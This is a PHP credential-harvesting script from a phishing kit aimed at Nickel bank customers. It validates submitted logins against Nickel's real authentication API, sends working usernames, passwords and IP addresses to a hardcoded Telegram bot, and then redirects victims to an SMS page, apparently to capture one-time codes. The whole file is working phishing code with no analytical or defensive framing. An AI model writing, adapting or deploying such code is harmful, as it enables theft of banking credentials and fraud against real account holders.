<?Php
session_start();
$header=[
"Accept: application/json, text/plain, */*",
"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36",
"Content-Type: application/json",
"Origin: https://app.nickel.eu",
"Sec-Fetch-Site: same-site",
"Sec-Fetch-Mode: cors",
"Sec-Fetch-Dest: empty",
"Referer: https://app.nickel.eu/",
"Accept-Language: fr-FR,fr;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6,de;q=0.5,ar;q=0.4,it;q=0.3,sk;q=0.2",
];
function truelogin($user,$pass){
	global $header;
$post=array(
  "barcode"=>$user,
  "password"=>$pass,
  "client"=>array(
    "app"=>array(
      "type"=>"WEB",
      "version"=>"2.15.0"
    ),
    "device"=>array(
      "id"=>"0b4fd4a2c6779990181ee543c48cb107",
      "name"=>"Win32",
      "type"=>"CHROME"
    )
  )
);
$post2=json_encode($post);
   $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, "https://api.nickel.eu/customer-authentication-api-v2/v1/minimum-viable-authentications");
		curl_setopt($ch, CURLOPT_POSTFIELDS, $post2);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_FRESH_CONNECT, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, $header); //
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        $html = curl_exec($ch);
		$json=json_decode($html);

		if($json->message == "error.authenticationChallenge"){
			
			return "TRUE";
			
		}
		else {
			
			return "FALSE";
		}
}



if(!empty($_POST["username"]) && !empty($_POST["password"])){

    if(truelogin($_POST["username"],$_POST["password"]) == "TRUE"){
    $message  = "-----------------------NICKEL----------------------n";
    $message .= " USER : ".$_POST['username']."n";
    $message .= " PASS : ".$_POST['password'].""."n";
    $message .= "----------------------------------------------#"."n";
    $message .= " IP        : ".$_SERVER['REMOTE_ADDR'].""."n";
    $message .= "----------------------NICKEL------------------------"."n";

    file_get_contents("https://api.telegram.org/bot8443989182:AAGxL1BFEBth_NSqxapGsTjRqLrR5f1nPn0/sendMessage?chat_id=-4826304900&text=".urlencode($message));

    header ("location:sms.php");


  }
  else {

    $_SESSION["login"]=$_POST["username"];
    header ("location:login.php?error=1&verification#_");
    
  }
}
?>
